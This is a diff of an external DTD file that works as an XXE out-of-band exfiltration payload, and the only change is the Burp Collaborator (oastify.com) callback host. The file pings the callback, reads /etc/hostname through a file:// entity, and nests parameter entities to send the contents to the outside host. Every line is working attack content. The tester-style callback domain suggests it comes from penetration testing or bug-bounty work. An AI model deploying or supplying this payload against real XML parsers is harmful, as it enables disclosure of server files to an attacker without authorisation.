@@ -1,6 +1,6 @@
-<!ENTITY % ping SYSTEM "http://jwjxxm1166mn92rnej0wyhtgd7j176baex11q.oastify.com/DTDPROCESSED">
+<!ENTITY % ping SYSTEM "http://vrq52n21kt17d0tcqgkhfjgjrax1ls9h.oastify.com/DTDPROCESSED">
 %ping;
 <!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://jwjxxm1166mn92rnej0wyhtgd7j176baex11q.oastify.com/FILE=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://vrq52n21kt17d0tcqgkhfjgjrax1ls9h.oastify.com/FILE=%file;'>">
 %eval;
 %exfil;
